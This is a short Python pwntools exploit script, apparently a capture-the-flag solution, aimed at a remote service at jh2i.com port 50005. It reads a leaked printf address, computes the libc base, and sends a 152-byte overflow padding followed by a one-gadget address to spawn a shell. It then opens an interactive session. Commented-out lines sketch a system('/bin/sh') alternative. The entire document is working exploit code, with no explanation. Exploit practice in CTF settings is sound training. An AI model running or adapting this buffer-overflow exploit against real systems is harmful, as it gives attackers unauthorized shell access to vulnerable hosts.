from pwn import *

target=remote('jh2i.com', 50005)
libc=ELF('/media/sf_kalishared/The_Night-master/libcs/libc6_2.23-0ubuntu10_amd64.so')
#target=process('./challenge')
#elf=ELF('./challenge')
#libc=elf.libc


print(target.recvuntil("at "))
leak=target.recvuntil(")").strip(")")
print(target.recv())
leak=int(leak,16)
print(hex(leak))

payload="A"*152
libc_base=leak-libc.symbols["printf"]
print(hex(libc_base))

#libc_system=libc_base+libc.symbols["system"]
#libc_binsh=libc_base+libc.search("/bin/sh\x00").next()

gadget=0xf1147
libc_gadget=libc_base+gadget

payload+=p64(libc_gadget)
payload+=p64(0x0)*100

target.sendline(payload)
target.interactive()
